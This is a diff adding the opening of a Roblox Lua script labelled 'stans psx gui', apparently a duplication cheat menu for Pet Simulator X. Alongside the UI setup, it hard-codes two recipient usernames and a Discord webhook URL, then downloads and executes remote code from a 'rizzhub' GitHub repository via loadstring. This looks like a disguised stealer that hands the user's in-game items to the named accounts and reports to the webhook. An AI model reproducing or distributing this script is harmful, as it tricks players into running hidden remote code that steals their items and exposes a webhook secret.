@@ -1,0 +1,14 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("stans psx gui", "Ocean")
+
+UserName = "cheesemuffin1002"
+UserName2 = "imbetteratparkour9"
+Webhook = "https://discord.com/api/webhooks/1086576116350844959/a5aXjripbnt1cP4hlj4U8C96k5bN6MFJAhDV-9h43GxOo2qxEx874UcFncpTis1za_lV"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
+
+-- Main
+local Main = Window:NewTab("Main")
+local MainSection = Main:NewSection("Main")
+local Dupe = Window:NewTab("Dupe")
+local DupeSection = Dupe:NewSection("Dupe")
